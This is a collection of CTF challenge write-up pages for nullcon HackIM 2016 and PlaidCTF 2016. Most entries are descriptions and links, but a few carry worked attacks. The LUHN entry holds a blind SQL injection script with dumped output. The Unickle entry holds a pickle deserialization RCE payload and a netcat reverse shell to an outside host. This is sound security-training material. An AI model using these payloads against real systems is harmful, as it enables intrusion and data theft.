## Other write-ups and resources

* <https://github.com/tuvshuud/1up/blob/master/hackim2016/misc300.md>
* <https://0x90r00t.com/2016/02/03/hackim-2016misc-300-know-india-write-up/>
# nullcon HackIM : LOL

**Category:** Misc
**Points:** 400
**Solves:** 
**Description:**

> Decode this - LOL
> 
> 52.91.163.151:30303


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/raccoons-team/ctf/tree/master/2016-01-30-nullcon-hackim/misc_400_lol>
* <https://github.com/tuvshuud/1up/blob/master/hackim2016/misc400.md>
* <https://0x90r00t.com/2016/02/03/hackim-2016misc-400-lol-write-up/>
# nullcon HackIM : Programming Question 1

**Category:** Programming
**Points:** 200
**Solves:** 
**Description:**

> So you reached Delhi and now the noise in your head is not allowing you to think rationally. The Nosise in your head has origin its Origin in your Stomach. And this is a big hunger. You can finish one or probably 2 Tandoori Chicken. So where can you get the best Tandoori Chicken in Delhi? This place tweeted last week that the Tandoori Chicken it servers is like never B4. You got its twitter handle?


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.xil.se/post/hackim-2016-programming-1-arturo182/>
* <https://www.youtube.com/watch?v=kfhBoEkJW5Q&feature=youtu.be>
* <http://ctf.s4thi5h.com/nullcon-hackim-2016-ctf-programming/>
* <http://corb3nik.github.io/2016/01/29/programming-1/>
* [Chinese](http://www.cnblogs.com/Christmas/p/5176333.html)
* <https://0x90r00t.com/2016/02/03/hackim-2016prog-134-200300400-write-up/>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/HackIM/programming.md>
# nullcon HackIM : Programming Question 2

**Category:** Programming
**Points:** 300
**Solves:** 
**Description:**

> Your simple good Deeds can save you but your GREED can kill you. This has happened before. This greedy person lived a miserable life just for the greed of gold and lust. You must know him, once you know him, you must reach his capital and next clues will be given by his famous EX-Body Guard. This file consists of few paragraphs. Each paragraph singles out one Alphabet. Scrambling those Aplphabets will help you to know the country of this Ruler. Who was this Ruler?
> 
> 
> [TheLastRuler](./TheLastRuler.txt)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2016-01-29-nullcon/recon_2#eng-version>
* <https://www.youtube.com/watch?v=aaaeuM8_4nM&feature=youtu.be>
* <http://ctf.s4thi5h.com/nullcon-hackim-2016-ctf-programming/>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/HackIM/programming.md>
* [Chinese](http://www.cnblogs.com/Christmas/p/5176413.html)
# nullcon HackIM : Programming Question 3

**Category:** Programming
**Points:** 300
**Solves:** 
**Description:**

> Still Hungry and unsutisfied, you are looking for more. Some more, unique un heard dishes. Then you can find one to make it your self. Its his Dish. He has his own website which is he describes as " a social home for each of our passions". The link to his website is on his google+ page. whats the name of his site. By the way he loves and hogs on "Onion Kheer". Have you heard of "Onion Kheer"?


## Write-up

(TODO)

## Other write-ups and resources

* <https://corb3nik.github.io/2016/01/29/programming-3/>
* <https://github.com/p4-team/ctf/tree/master/2016-01-29-nullcon/recon_3#eng-version>
* <https://www.xil.se/post/hackim-2016-programming-3-arturo182/>
* <http://ctf.s4thi5h.com/nullcon-hackim-2016-ctf-programming/>
* <https://www.youtube.com/watch?v=P1owhAm_yRQ&feature=youtu.be>
* [Chinese](http://www.cnblogs.com/Christmas/p/5176428.html)
* <https://0x90r00t.com/2016/02/03/hackim-2016prog-134-200300400-write-up/>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/HackIM/programming.md>
# nullcon HackIM : Programming Question 4

**Category:** Programming
**Points:** 400
**Solves:** 
**Description:**

> One of the NullCon vidoes talked about a marvalous Russian Gift. The Vidoe was uploaded on [May of 2015] What is the ID of that youtube video.


## Write-up

(TODO)

## Other write-ups and resources

* <https://corb3nik.github.io/2016/01/29/programming-4/>
* <https://github.com/p4-team/ctf/tree/master/2016-01-29-nullcon/recon_4#eng-version>
* <https://www.xil.se/post/hackim-2016-programming-4-arturo182/>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/HackIM/programming.md>
* <http://ctf.s4thi5h.com/nullcon-hackim-2016-ctf-programming/>
* [Chinese](http://www.cnblogs.com/Christmas/p/5176439.html)
* <https://0x90r00t.com/2016/02/03/hackim-2016prog-134-200300400-write-up/>
# nullcon HackIM : Programming Question 5

**Category:** Programming
**Points:** 500
**Solves:** 
**Description:**

> Dont blink your Eyes, you might miss it. But the fatigue and exhaustion rules out any logic, any will to stay awake. What you need now is a slumber. Cat nap will not do. 1 is LIFE and 0 is DEAD. in this GAME OF LIFE sleep is as important food. So... catch some sleep. But Remember...In the world of 10x10 matirx, the Life exists. If you SLOTH, sleep for 7 Ticks, or 7 Generation, In the game of Life can you tell what will be the state of the world? 
> 
> The world- 10x10
> 
> 0000000000,0000000000,0001111100,0000000100,0000001000,0000010000,0000100000,0001000000,0000000000,000000000


## Write-up

(TODO)

## Other write-ups and resources

* <https://corb3nik.github.io/2016/01/29/programming-5/>
* <https://www.xil.se/post/hackim-2016-programming-5-arturo182/>
* <http://ctf.s4thi5h.com/nullcon-hackim-2016-ctf-programming/>
* [Chinese](http://www.cnblogs.com/Christmas/p/5176464.html)
* <https://0x90r00t.com/2016/02/03/hackim-2016programming-500-programming-question-5-write-up/>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/HackIM/programming.md>
# nullcon HackIM : donfos

**Category:** Reverse Engineering
**Points:** 500
**Solves:** 
**Description:**

> Lost in Const.
> 
> 
> [donfos_reversing](./donfos_reversing)


## Write-up

(TODO)

## Other write-ups and resources

* <http://www.kizhakkinan.com/?cat=22>
# nullcon HackIM : PrisonBreak

**Category:** Reverse Engineering
**Points:** 500
**Solves:** 
**Description:**

> Break it Free.


## Write-up

(TODO)

## Other write-ups and resources

* [Partial writeup](https://github.com/raccoons-team/ctf/tree/master/2016-01-30-nullcon-hackim/re_500_prison_break)
# nullcon HackIM : Pseudorandom

**Category:** Reverse Engineering
**Points:** 300
**Solves:** 
**Description:**

> Random as F*!@
> 
> 
> [pseudorandom_bin](./pseudorandom_bin)


## Write-up

(TODO)

## Other write-ups and resources

* <http://bannsecurity.com/index.php/home/10-ctf-writeups/27-hackim-2016-pseudorandom>
* <https://www.xil.se/post/hackim-2016-re-2-kbeckmann/>
* <https://github.com/Team-Sportsball/CTFs-2016/blob/master/nullcon-hackim-2016/RE_2/pseudorandom.md>
# nullcon HackIM : ZorroPub

**Category:** Reverse Engineering
**Points:** 100
**Solves:** 
**Description:**

> ZorroPub
> 
> 
> [zorro_bin](./zorro_bin)


## Write-up

(TODO)

## Other write-ups and resources

* <http://vulnerablespace.blogspot.co.uk/2016/01/ctf-writeup-hackim-2016-zorropub-re-100.html>
* <http://bannsecurity.com/index.php/home/10-ctf-writeups/26-hackim-2016-zorropub>
* <https://www.xil.se/post/hackim-2016-re-1-kbeckmann/>
* <https://medium.com/guilty-spork/hackim-re-100-zorropub-89f81c3f7c16#.tb869lzaf>
* <https://github.com/Team-Sportsball/CTFs-2016/blob/master/nullcon-hackim-2016/RE_1/zorro_pub.md>
# nullcon HackIM write-ups

* <http://ctf.nullcon.net/>
* [Scoreboard](http://ctf.nullcon.net/scoreboard.php) or [local alternative](scoreboard)

## Completed write-ups

* [crypto/crypto-1-500](crypto/crypto-1-500)
* [crypto/crypto-2-400](crypto/crypto-2-400)
* [crypto/crypto-3-400](crypto/crypto-3-400)
* [crypto/crypto-4-200](crypto/crypto-4-200)
* [crypto/crypto-5-500](crypto/crypto-5-500)
* [trivia/trivia-300](trivia/trivia-300)
* [web/luhn-300](web/luhn-300)
* [web/smashthestate-400](web/smashthestate-400)
* [web/unickle-200](web/unickle-200)

## External write-ups only

* [exploitation/exploitation-100](exploitation/exploitation-100)
* [exploitation/exploitation-200](exploitation/exploitation-200)
* [exploitation/exploitation-300](exploitation/exploitation-300)
* [forensics/catchmeifyoucan-100](forensics/catchmeifyoucan-100)
* [forensics/sculptme-200](forensics/sculptme-200)
* [misc/hiding-in-plain-sight-200](misc/hiding-in-plain-sight-200)
* [misc/know-india-300](misc/know-india-300)
* [misc/lol-400](misc/lol-400)
* [programming/programming-200](programming/programming-200)
* [programming/programming-300-1](programming/programming-300-1)
* [programming/programming-300-2](programming/programming-300-2)
* [programming/programming-400](programming/programming-400)
* [programming/programming-500](programming/programming-500)
* [re/donfos-500](re/donfos-500)
* [re/prisonbreak-500](re/prisonbreak-500)
* [re/pseudorandom-300](re/pseudorandom-300)
* [re/zorropub-100](re/zorropub-100)
* [trivia/trivia-100](trivia/trivia-100)
* [trivia/trivia-200](trivia/trivia-200)
* [trivia/trivia-400](trivia/trivia-400)
* [web/hqlol-500](web/hqlol-500)
* [web/signserver-100](web/signserver-100)

## Missing write-ups

* [exploitation/exploitation-400](exploitation/exploitation-400)
* [forensics/file-and-folders-500](forensics/file-and-folders-500)
* [forensics/payload-delivers-fantastic-300](forensics/payload-delivers-fantastic-300)
* [forensics/peepingtom-400](forensics/peepingtom-400)
* [misc/calligraphy-100](misc/calligraphy-100)# nullcon HackIM : Trivia Question 1

**Category:** Trivia
**Points:** 100
**Solves:** 
**Description:**

> In the memory of those from the blast of the past nullcon, gif shows the way!


## Write-up

(TODO)

## Other write-ups and resources

* <http://ctf.c0deguard.com/nullcon-ctf-hackim-2016-trivia-writeups/>
# nullcon HackIM : Trivia Question 2

**Category:** Trivia
**Points:** 200
**Solves:** 
**Description:**

> I love this song. What is my project ID?
> 
> 
> [trivia2.mp3](./trivia2.mp3)


## Write-up

(TODO)

## Other write-ups and resources

* <http://ctf.c0deguard.com/nullcon-ctf-hackim-2016-trivia-writeups/>
* <https://github.com/p4-team/ctf/tree/master/2016-01-29-nullcon/trivia_2#eng-version>
# nullcon HackIM : Trivia Question 3

**Category:** Trivia
**Points:** 300
**Solves:** 
**Description:**

> Bill Gates loves Cipher.
> 
> 
> [trivia3.png](./trivia3.png)


## Write-up

by [steelsoldat](https://github.com/steelsoldat)

Opening the image leads us to see multiple characters that are not of any langauge set, but once we google one of them cropped from the picture we are led to [Bill's Cipher from Gravity Falls](http://gravityfalls.wikia.com/wiki/List_of_cryptograms#Bill.27s_symbol_substitution_cipher). 

It a simple substition cipher where you match the character with their corresponding English counterparts.

This leads to the flag 

```
AGLISURAKSHAKIVASTU
```

## Other write-ups and resources

* <http://ctf.c0deguard.com/nullcon-ctf-hackim-2016-trivia-writeups/>
* <https://www.xil.se/post/hackim-2016-trivia-3-arturo182/>
* <https://0x90r00t.com/2016/02/01/hackim-2016-trivia-question-3-write-up/>
# nullcon HackIM : Trivia Question 4

**Category:** Trivia
**Points:** 400
**Solves:** 
**Description:**

> Use the file. Get the flag. But, you know what, I hate pipes.
> 
> 
> [trivia4.txt](./trivia4.txt)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/raccoons-team/ctf/tree/master/2016-01-30-nullcon-hackim/trivia_400>
* <http://ctf.c0deguard.com/nullcon-ctf-hackim-2016-trivia-writeups/>
* <https://www.xil.se/post/hackim-2016-trivia-4-arturo182/>
# nullcon HackIM : HQLol

**Category:** Web
**Points:** 500
**Solves:**
**Description:**

> Plenty of hacker movies. 
>
> But table FLAG isn't mapped by HQL and you aren't an DB administrator. 
>
> Anyway, [good luck](52.91.163.151:8080)!

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2016-01-29-nullcon/web_5#eng-version>
# nullcon HackIM : LUHN

**Category:** Web
**Points:** 300
**Solves:** 
**Description:**

> A new service allows you to check if you credit card has been compromised. You just need to enter your credit card number and you instantly know if it has been leaked on the Darknet.
> 
> 
> <http://52.91.163.151/>


## Write-up

by [lanjelot](https://github.com/lanjelot)

The website consists of only one form that POSTs the `cc` parameter.

* Submitting the credit card number 4111111111111111 returns "Your CC has been compromised".
* Submitting a number with an invalid Luhn checksum (e.g. 4111411141114111) returns "Invalid CC".
* Submitting a number with a valid Luhn checksum (e.g. 4123123412341236) returns "We do not have your CC in our database".

The `cc` parameter seems to be vulnerable to SQL injection because `cc=4111111111111111' and 0=0-- ` returns "Your CC has been compromised". However sending `' or 1=1-- ` returns "Invalid CC".

Looks like in order to exploit the SQL injection, our payload must have a valid [Luhn](https://en.wikipedia.org/wiki/Luhn_algorithm) checksum (i.e. 00 is valid but 11 isn't ). So I found this neat Python [project] (https://github.com/benhodgson/baluhn) to generate valid checksums.

And I used my SQLi framework [albatar](https://github.com/lanjelot/albatar) to automate exploitation:

```python
#!/usr/bin/env python

from albatar import *
from baluhn import generate
from urllib import quote

PROXIES = {} #'http': 'http://127.0.0.1:8082', 'https': 'http://127.0.0.1:8082'}
HEADERS = ['User-Agent: Mozilla/5.0']

def test_state_grep(headers, body, time):
  if 'Your CC has been compromised' in body:
    return 1
  else:
    return 0

def add_luhn(s):
  digits = filter(lambda c: c.isdigit(), s)

  # our payload must have an even number of digits otherwise the serve computes
  # a different checksum than us
  if len(digits) % 2 == 0:
    s += '0'
    digits += '0'

  return quote(s + generate(''.join(digits)))

def mysql_boolean():

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://52.91.163.151/',
      body = 'cc=4111111111111111${injection}',
      method = 'POST',
      response_processor = test_state_grep,
      encode_payload = add_luhn,
      )

  template = "' and (ascii(substring((${query}),${char_pos},1))&${bit_mask})=${bit_mask} -- "

  return Method_bitwise(make_requester, template)

sqli = MySQL_Blind(mysql_boolean())

for r in sqli.exploit():
  print r
```

Output:
```
$ python luhn.py --columns
21:35:21 albatar - Executing: ('SELECT COUNT(*) FROM information_schema.columns WHERE table_schema NOT IN ("information_schema","mysql","performance_schema")', 'SELECT CONCAT_WS(0x3a,table_schema,table_name,column_name) FROM information_schema.columns WHERE table_schema NOT IN ("information_schema","mysql","performance_schema") LIMIT ${row_pos},1')
21:35:22 albatar - count: 4
cccheck:cc:id
cccheck:cc:cc_number
cccheck:token:id
cccheck:token:value
21:35:44 albatar - Time: 23.11 seconds
$ python luhn.py -D cccheck -T token -C value --dump
21:36:02 albatar - Executing: ('SELECT COUNT(*) FROM cccheck.token', 'SELECT CONCAT_WS(0x3a,value) FROM cccheck.token LIMIT ${row_pos},1')
21:36:04 albatar - count: 1
RIeVoh3eeahthu7Ee
21:36:08 albatar - Time: 6.31 seconds
```

## Other write-ups and resources

* none yet
# nullcon HackIM : SignServer

**Category:** Web
**Points:** 100
**Solves:** 
**Description:**

> Document signature is so hot right now! SignServer provides you with the most advanced solution to sign and verify your documents. We support any document types and provide you with a unique, ultra-secure signature. <http://54.174.72.79:9000>


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/blob/master/2016-01-29-nullcon/web_1/README.md#eng-version>
* <https://github.com/tuvshuud/1up/blob/master/hackim2016/web100.md>
# nullcon HackIM : smashthestate

**Category:** Web
**Points:** 400
**Solves:**
**Description:**

> This beautiful website for testing zip files contains a replica of a vulnerability found in a well known bug bounty site.
>
> Log in with rob:smashthestate then exploit the vulnerability to gain access to the 'admin' account and the flag.
>
> Automated tools and bruteforcing will not help you solve this challenge.
>
>
> <http://54.152.101.3/>

[index.php](./index.php)

## Write-up

by d1rt

Logging into the server with the `rob:smashthestate` combo takes you to a form that promises to allow you to upload and confirm zip file contents, if you upload a zip file containing a directory you'll be given an error from the `cat` command printed on screen.

`cat: /var/www/html/tmp/upload_18vrn198vcn191nv1/test: Is a directory`

Make a local symlink, then store it in a zip file that preserves symlinks

```
$ ln -s ../../index.php flag
$ zip -y flag.zip flag
  adding: flag (stored 0%)
```

Upload this to the server and you'll get the source code of `index.php` dumped to the page

```
<!--?php
$FAKE_DATABASE = array (
    "rob" =--> "60df0ab1a78fd0d95a4cfa4b0854931b", // smashthestate
    "admin" =&gt; "6ec4b9f5cd1d4fd45746f8e592aa321e",
);
$page = $_GET['page'];

switch ($page) {
    case "login":
        echo "trying to log in";
        $user = $_POST['user'];
        $pass = $_POST['pass'];
...snip...
```

There is a section the appears to dump the flag:

```
    case "admin_login_help":
        session_start();
        if(!isset($_SESSION['login_code']) ){
            $_SESSION['login_code'] = bin2hex(openssl_random_pseudo_bytes(18));
            echo "khack has disabled zis function, please click <a href="?page=code_submit">here</a>\n";
        }
        else {
            echo "khack has disabled the function for zis session";
        }
        break;
    case "code_submit":
        session_start();
        $code = $_POST['code'];
        if (isset($code) &amp;&amp; isset($_SESSION['login_code'])) {
            if ($code == "khack" ){
                echo "Flag: ";
                passthru("sudo /bin/cat /var/www/html/flag");
            }
            else {
                echo "Invalid code";
            }
        }
        else {
            echo "<form action="?page=code_submit" method="POST">Please input the login code:<input name="code"><input type="submit" value="submit"></form>";
        }
```

**it is a lie and always dumps an empty flag**

just submit the md5i hash of the admin password, done.


## Other write-ups and resources

* <http://losfuzzys.github.io/writeup/2016/02/02/hackim2016-smashthestate400/>
* <https://0x90r00t.com/2016/02/03/hackim-2016web-400-smashthestate-write-up/>
# nullcon HackIM : Unickle

**Category:** Web
**Points:** 200
**Solves:**
**Description:**

> OSaaS is the new trend for 2016! Store your object directly in the cloud. Get rid of the hassle of managing your own storage for object with Osaas. Unickle currently offers a beta version that demonstrates how OSaaS will make the internet a better place... One object at a time!!
>
>
> <http://54.84.124.93/>

[Server files](./var/www)

## Write-up

by d1rt

Immediately on visiting the target URL you're greeted with a list of "objects", each has an id.

`http://54.84.124.93/?cat=1`

The `cat` param is a sql injection opportunity

`http://54.84.124.93/?cat=1/**/or/**/1=1/**/union/**/all/**/select/**/1,2,3,4--`

This injection leads to a Python error being printed on the final row of the output table in the 3rd field.

`1    2    'int' object has no attribute 'encode'  4`

This means we now control a payload that is being passed to Python for execution, based on the output of other fields and hints in intro, it's a Python object injection flaw.  Now we craft our injected object.

```
#!/usr/bin/python2

import pickle
import os

class Inject(object):
    def __reduce__(self):
        return (os.system, ('/bin/ls',))

print pickle.dumps(Inject())
```

Confirm it works

```
$ ./makepickle.py
cposix
system
p0
(S'/bin/ls'
p1
tp2
Rp3
.
```

Not sqli friend, need to change out those new lines

```
$ ./makepickle.py | awk '{printf $1"%0a"}'
cposix%0asystem%0ap0%0a(S'/bin/ls'%0ap1%0atp2%0aRp3%0a.%0a
```

Now use it in the injection

`http://54.84.124.93/?cat=1/**/or/**/1=1/**/union/**/all/**/select/**/1,2,%27cposix%0asystem%0ap0%0a(S'/bin/ls'%0ap1%0atp2%0aRp3%0a.%0a%27,4--`

We have a functional injection, but not the value we'd expected

`1    2   512  4`

We then use the injection to trigger a reverse shell using netcat

`http://54.84.124.93/?cat=1/**/or/**/1=1/**/union/**/all/**/select/**/1,2,%27cposix%0asystem%0ap0%0a(S'/bin/nc -e/bin/bash 1.3.3.7 31337'%0ap1%0atp2%0aRp3%0a.%0a%27,4--`

```
$nc -vvv -l -p 31337
Listening on any address 31337
Connection from 54.84.124.93:47281
find / -name 'flag'
/var/www/flag
cat /var/www/flag
flag{OSaaS_with_union_and_tickle_trend_it_is!}
```


## Other write-ups and resources

* <https://github.com/bl4de/ctf/blob/master/2016/HackIM_2016/Unicle_Web200/Unicle_Web200_writeup.md>
* <http://losfuzzys.github.io/writeup/2016/02/02/hackim2016-unickle200/>
# PlaidCTF 2016 : rabit

**Category:** Crypto
**Points:** 175
**Solves:** 71
**Description:**

> Just give me a bit, the least significant's enough. Just a second we’re not broken, just very, very insecure. Running at rabit.pwning.xxx:7763

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/x64x6a/ctf/tree/master/PlaidCTF%202016/rabit>
* <https://gist.github.com/elliptic-shiho/9aba6a8f2869dea8a839a41ecc940fc0>
* <http://blog.clark.re/2016/04/plaidctf-2016-rabit-write-up.html>
* https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/PCTF/crypto/rabit
* https://github.com/p4-team/ctf/tree/master/2016-04-15-plaid-ctf/crypto_rabit
* https://github.com/TechSecCTF/writeups/blob/master/plaidctf2016/rabit/rabit.md
# PlaidCTF 2016 : radioactive

**Category:** Crypto
**Points:** 275
**Solves:** 8
**Description:**

> We just got this fancy new cryptographic device and it seems to work great… for the most part. But sometimes the values it gives me are wrong. Maybe you could take a look for me.

## Write-up

(TODO)

## Other write-ups and resources

* http://mslc.ctf.su/wp/plaidctf-2016-radioactive-crypto-275/
# PlaidCTF 2016 : sexec-300

**Category:** Crypto
**Points:** 300
**Solves:** 3
**Description:**

> If you need to securely grant execution privileges, what better way to do it than sexec? 
> 
> 
> This is running on sexec.pwning.xxx:9999

## Write-up

(TODO)

## Other write-ups and resources

* http://mslc.ctf.su/wp/plaidctf-2016-sexec-crypto-300/
# PlaidCTF 2016 : tonnerre

**Category:** Crypto
**Points:** 200
**Solves:** 8
**Description:**

> We were pretty sure the service at tonnerre.pwning.xxx:8561 (source) was totally secure. But then we came across [this website](http://tonnerre.pwning.xxx:8560/) and now we’re having second thoughts... We think they store the service users in the same database?

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/x64x6a/ctf/tree/master/PlaidCTF%202016/tonnerre>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/PCTF/crypto/tonnerre>
* <https://gist.github.com/Bono-iPad/124e7969d4f3ae0e0b4bd7518de7fd7b>
* <https://duksctf.github.io/PCTF2016-tonnerre/>
* <https://grocid.net/2016/04/17/plaidctf-tonnerre/>
* https://github.com/TechSecCTF/writeups/blob/master/plaidctf2016/tonnerre/tonnerre.md
* https://github.com/p4-team/ctf/tree/master/2016-04-15-plaid-ctf/crypto_tonnerre
# PlaidCTF 2016 : Exponentiation-is-Hard

**Category:** Misc
**Points:** 50
**Solves:** 86
**Description:**

## Write-up

> pow(5519117190405, 2, 36620698197184150886934780417736785899286763272338791747362963184841801750327151112306249688251166942886661835559506975975707963993727412454531111131497522628925665187177482321006716251711989384331015718920870220319989803289027643830003689665702600492053982320351954323958550720798506779897617401364619613169464060947339101271843599172133534443261538683960602107804087030956000675854087181711124213887850946702876663207624764500658667089502719100806234117)

## Other write-ups and resources

* https://ctftime.org/writeup/3194
# PlaidCTF 2016 : hevc-50

**Category:** Misc
**Points:** 50
**Solves:** 217
**Description:**

> Welcome to the future.

## Write-up

(TODO)

## Other write-ups and resources

* http://www.slideshare.net/sehanlee7/plaidctf-2016-writeup-hevc-misc-50pts
# PlaidCTF 2016 : Kriptovor-300

**Category:** Misc
**Points:** 300
**Solves:** 11
**Description:**

> HALP I GOT PWNED AND I DON'T HAVE ANY BITCOINS 
> 
> 
> 
> (WARNING: this zip is password protected with the password "infected". The exe file it has contains de-fanged malware (as does a later stage of the problem). 
> 
> 
> This should not be active as is and will not infect your machine/encrypt your files, but please be very very careful as this is based on real ransomware. It is entirely possible to solve this without the exe files, but they are included for completeness.)

## Write-up

(TODO)

## Other write-ups and resources

* <https://duksctf.github.io/PCTF2016-kriptovor/>
# PlaidCTF 2016 : morset

**Category:** Misc
**Points:** 50
**Solves:** 86
**Description:**

> A mysterious signal… can you decode it? 
> 
> 
> Running at morset.pwning.xxx:11821

## Write-up

(TODO)

## Other write-ups and resources

* <https://duksctf.github.io/PCTF2016-morset/>
* https://github.com/p4-team/ctf/tree/master/2016-04-15-plaid-ctf/misc_morset
* http://quanyang.github.io/plaid-ctf-2016-morset-misc-50/

# PlaidCTF 2016 : plane_site

**Category:** Misc
**Points:** 75
**Solves:** 438
**Description:**

> What? You can’t see the flag?

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/VulnHub/ctf-writeups/blob/master/2016/plaidctf/Misc_plane_site_75.md>
* http://imgur.com/a/YQBA0
* http://solorab.net/blog/2016/04/18/plaidctf-2016-misc/
* https://github.com/TechSecCTF/writeups/blob/master/plaidctf2016/plane_site/plane_site.md
# PlaidCTF 2016 : sanity-check

**Category:** Misc
**Points:** 1
**Solves:** 806
**Description:**

> The flag is PCTF{poop}

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# PlaidCTF 2016 : the-stuff

**Category:** Misc
**Points:** 50
**Solves:** 219
**Description:**

> Can you believe Ryan uses Bing?

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/VulnHub/ctf-writeups/blob/master/2016/plaidctf/Misc_the_stuff_50.md>
* <https://duksctf.github.io/PCTF2016-the-stuff/>
* https://github.com/TechSecCTF/writeups/blob/master/plaidctf2016/thestuff/thestuff.md
* https://github.com/p4-team/ctf/tree/master/2016-04-15-plaid-ctf/misc_the_stuff
# PlaidCTF 2016 : Untitled-1.pdf

**Category:** Misc
**Points:** 50
**Solves:** 286
**Description:**

> This PDF has a flag on it, but I can't find it... can you?

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/VulnHub/ctf-writeups/blob/master/2016/plaidctf/Misc_Untitle_1_pdf_50.md>
* https://github.com/TechSecCTF/writeups/blob/master/plaidctf2016/untitled/untitled.md
* https://github.com/p4-team/ctf/tree/master/2016-04-15-plaid-ctf/misc_untitled
# PlaidCTF 2016 : awkward

**Category:** Pwnable
**Points:** 600
**Solves:** 3
**Description:**

> Yeah, your AWK is pretty cool, I guess. But I think ours is even cooler. 
> 
> 
> Running at awkward.pwning.xxx:2323 
> 
> 
> Download libc, if you want.

## Write-up

(TODO)

## Other write-ups and resources

* <https://dougallj.wordpress.com/2016/04/18/plaidctf-2016-awkward-pwnable-600/>
* <https://gist.github.com/brianairb/dc6f5b6d21d6c7ecacf83dd9b65dc288>
# PlaidCTF 2016 : butterfly

**Category:** Pwnable
**Points:** 150
**Solves:** 99
**Description:**

> Sometimes the universe smiles upon you. And sometimes, well, you just have to roll your sleeves up and do things yourself. Running at butterfly.pwning.xxx:9999 
> 
> 
> Notes: The binary has been updated. Please download again if you have the old version. The only difference is that the new version (that's running on the server) has added setbuf(stdout, NULL); line.

## Write-up

(TODO)

## Other write-ups and resources

* <https://systemoverlord.com/2016/04/17/plaidctf-2016-butterfly.html>
* <https://github.com/x64x6a/ctf/tree/master/PlaidCTF%202016/butterfly>
* <http://r0p.club/2016/butterfly/>
* <https://github.com/burlingpwn/Writeups/tree/master/PlaidCTF-2016/butterfly>
* <https://b01lers.net/challenges/Plaid%202016/butterfly/101/>
* <https://duksctf.github.io/PCTF2016-butterfly/>
* <http://redgetan.cc/plaid-ctf-2016-butterfly-writeup/>
* https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/PCTF/pwnable/butterfly
* http://solorab.net/blog/2016/04/18/plaidctf-2016-butterfly/
* http://j31d0.github.io/writeup/2016/04/18/pctf2016-butterfly/
* http://www.hamidx9.ir/solutions/2016/plaidctf/butterfly/sol.py
* http://ebfe.dk/ctf/2016/04/20/plaidctf-butterfly/
# PlaidCTF 2016 : fixedpoint

**Category:** Pwnable
**Points:** 175
**Solves:** 56
**Description:**

> IEEE754 is useful when your values go from -inf to +inf, but really, fixed point is all you need. 
> 
> 
> But if you want, you could grab this too. 
> 
> 
> Running at fixedpoint.pwning.xxx:7777

## Write-up

(TODO)

## Other write-ups and resources

* <https://b01lers.net/challenges/Plaid%202016/fixedpoint/102/>
* <https://duksctf.github.io/PCTF2016-fixedpoint/>
* <https://github.com/rick2600/writeups/blob/master/PlaidCTF2016/fixedpoint.md>
* http://solorab.net/blog/2016/04/18/plaidctf-2016-fixedpoint/
* http://j31d0.github.io/writeup/2016/04/18/pctf2016-fixedpoint/
* https://github.com/TUCTF/write-ups-2015/blob/master/PlaidCTF/Pwn/fixedpoint/pwn_175.py
# PlaidCTF 2016 : js_sandbox

**Category:** Pwnable
**Points:** 666
**Solves:** 2
**Description:**

> Can you get a flag off of [this site](http://js.pwning.xxx:27251/)? If so, I've got 666 points with your name on it!

## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/sroettger/d077d3907999aaa0f89d11d956b438ea>
* <https://rzhou.org/~ricky/pctf2016/js_sandbox.js>
# PlaidCTF 2016 : pound

**Category:** Pwnable
**Points:** 290
**Solves:** 20
**Description:**

> Trump top tweets and money simulation machine! Do you have enough to build a wall??? Running at pound.pwning.xxx:9765

## Write-up

(TODO)

## Other write-ups and resources

* http://solorab.net/blog/2016/04/18/plaidctf-2016-pound/
* https://github.com/p4-team/ctf/tree/master/2016-04-15-plaid-ctf/pwnable_pound
* http://toh.necst.it/plaidctf/2016/exploitable/Pound/
* http://j31d0.github.io/writeup/2016/04/18/pctf2016-pound/
# PlaidCTF 2016 : pzip

**Category:** Pwnable
**Points:** 400
**Solves:** 7
**Description:**

> This is just the alpha version, so we haven’t gotten around to using middle-out compression. There also might be some bugs… 
> 
> 
> Running at pzip.pwning.xxx:9999

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# PlaidCTF 2016 : unix_time_formatter

**Category:** Pwnable
**Points:** 76
**Solves:** 113
**Description:**

> Converting Unix time to a date is hard, so Mary wrote a tool to do so. 
> 
> 
> Can you you exploit it to get a shell? Running at unix.pwning.xxx:9999

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/VulnHub/ctf-writeups/blob/master/2016/plaidctf/unix_time_formatter.md>
* <https://duksctf.github.io/PCTF2016-unix-time-formatter/>
* http://j31d0.github.io/writeup/2016/04/18/pctf2016-unixformat/
* https://b01lers.net/challenges/Plaid%202016/unix%20time%20formatter/104/
* https://github.com/burlingpwn/writeups/tree/master/PlaidCTF-2016/unix_time_formatter
# PlaidCTF 2016 write-ups

* [Scoreboard](https://play.plaidctf.com/scoreboard) or [local alternative](scoreboard.txt)

## Completed write-ups

* [misc/Exponentiation-is-Hard-50](misc/Exponentiation-is-Hard-50)

## External write-ups only

* [reversing/rage-against-the-machine-250](reversing/rage-against-the-machine-250)
* [reversing/quick-175](reversing/quick-175)
* [reversing/quite-quixotic-quest-300](reversing/quite-quixotic-quest-300)
* [misc/Untitled-1.pdf-50](misc/Untitled-1.pdf-50)
* [misc/Kriptovor-300](misc/Kriptovor-300)
* [misc/morset-50](misc/morset-50)
